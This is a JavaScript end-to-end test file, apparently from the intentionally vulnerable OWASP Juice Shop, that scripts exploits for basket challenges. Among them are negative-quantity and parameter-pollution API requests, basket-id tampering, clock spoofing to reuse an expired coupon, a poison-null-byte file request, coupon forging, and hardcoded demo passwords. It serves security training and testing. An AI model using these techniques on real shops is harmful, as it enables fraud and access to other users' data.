const insecurity = require('../../lib/insecurity')
const config = require('config')
const models = require('../../models/index')

describe('/#/basket', () => {
  describe('as admin', () => {
    protractor.beforeEach.login({ email: 'admin@' + config.get('application.domain'), password: 'admin123' })

    describe('challenge "negativeOrder"', () => {
      it('should be possible to update a basket to a negative quantity via the Rest API', () => {
        browser.waitForAngularEnabled(false)
        browser.executeScript('var xhttp = new XMLHttpRequest(); xhttp.onreadystatechange = function() { if (this.status == 200) { console.log("Success"); }}; xhttp.open("PUT","http://localhost:3000/api/BasketItems/1", true); xhttp.setRequestHeader("Content-type","application/json"); xhttp.setRequestHeader("Authorization",`Bearer ${localStorage.getItem("token")}`); xhttp.send(JSON.stringify({"quantity": -100000}));') // eslint-disable-line
        browser.driver.sleep(1000)
        browser.waitForAngularEnabled(true)

        browser.get('/#/basket')

        const productQuantities = $$('mat-cell.mat-column-quantity > span')
        expect(productQuantities.first().getText()).toMatch(/-100000/)
      })

      it('should be possible to place an order with a negative total amount', () => {
        element(by.id('checkoutButton')).click()
      })

      protractor.expect.challengeSolved({ challenge: 'Payback Time' })
    })

    describe('challenge "Basket Access Tier 1"', () => {
      it('should access basket with id from session storage instead of the one associated to logged-in user', () => {
        browser.executeScript('window.sessionStorage.bid = 3;')

        browser.get('/#/basket')

        // TODO Verify functionally that it's not the basket of the admin
      })

      protractor.expect.challengeSolved({ challenge: 'Basket Access Tier 1' })
    })

    describe('challenge "Basket Access Tier 2"', () => {
      it('should manipulate basket of other user instead of the one associated to logged-in user', () => {
        browser.waitForAngularEnabled(false)
        browser.executeScript(() => {
          var xhttp = new XMLHttpRequest()
          xhttp.onreadystatechange = function () {
            if (this.status === 200) {
              console.log('Success')
            }
          }

          xhttp.open('POST', 'http://localhost:3000/api/BasketItems/')
          xhttp.setRequestHeader('Content-type', 'text/plain')
          xhttp.setRequestHeader('Authorization', `Bearer ${localStorage.getItem('token')}`)
          xhttp.send('{ "ProductId": 14,"BasketId":"1","quantity":1,"BasketId":"2" }') //eslint-disable-line
        })
        browser.driver.sleep(1000)
        browser.waitForAngularEnabled(true)
      })

      protractor.expect.challengeSolved({ challenge: 'Basket Access Tier 2' })
    })
  })

  describe('as jim', () => {
    protractor.beforeEach.login({ email: 'jim@' + config.get('application.domain'), password: 'ncc-1701' })
    describe('challenge "manipulateClock"', () => {
      it('should be possible to enter WMNSDY2019 coupon', () => {
        browser.executeScript('window.localStorage.couponPanelExpanded = false;')

        browser.get('/#/basket')
        browser.executeScript('event = new Date("March 08, 2019 00:00:00"); Date = function(Date){return function() {date = event; return date; }}(Date);')

        element(by.id('collapseCouponButton')).click()
        browser.wait(protractor.ExpectedConditions.presenceOf($('#coupon')), 5000, 'Coupon textfield not present.') // eslint-disable-line no-undef

        element(by.id('coupon')).sendKeys('WMNSDY2019')
        element(by.id('applyCouponButton')).click()
      })

      it('should be possible to place an order with the expired coupon', () => {
        element(by.id('checkoutButton')).click()
      })

      protractor.expect.challengeSolved({ challenge: 'Expired Coupon' })
    })

    describe('challenge "forgedCoupon"', () => {
      it('should be able to access file /ftp/coupons_2013.md.bak with poison null byte attack', () => {
        browser.driver.get(browser.baseUrl + '/ftp/coupons_2013.md.bak%2500.md')
      })

      it('should be possible to add a product in the basket', () => {
        browser.waitForAngularEnabled(false)
        models.sequelize.query('SELECT * FROM PRODUCTS').then(([products]) => {
          browser.executeScript('var xhttp = new XMLHttpRequest(); xhttp.onreadystatechange = function () { if (this.status === 201) { console.log("Success") } } ; xhttp.open("POST", "http://localhost:3000/api/BasketItems/", true); xhttp.setRequestHeader("Content-type", "application/json"); xhttp.setRequestHeader("Authorization", `Bearer ${localStorage.getItem("token")}`); xhttp.send(JSON.stringify({"BasketId": `${sessionStorage.getItem("bid")}`, "ProductId":' + 1 + ', "quantity": 1}))') // eslint-disable-line
        })
        browser.driver.sleep(1000)
        browser.waitForAngularEnabled(true)
      })

      it('should be possible to enter a coupon that gives an 80% discount', () => {
        browser.executeScript('window.localStorage.couponPanelExpanded = false;')

        browser.get('/#/basket')
        element(by.id('collapseCouponButton')).click()
        browser.wait(protractor.ExpectedConditions.presenceOf($('#coupon')), 5000, 'Coupon textfield not present.') // eslint-disable-line no-undef

        element(by.id('coupon')).sendKeys(insecurity.generateCoupon(90))
        element(by.id('applyCouponButton')).click()
      })

      it('should be possible to place an order with a forged coupon', () => {
        element(by.id('checkoutButton')).click()
      })

      protractor.expect.challengeSolved({ challenge: 'Forged Coupon' })
    })
  })
})
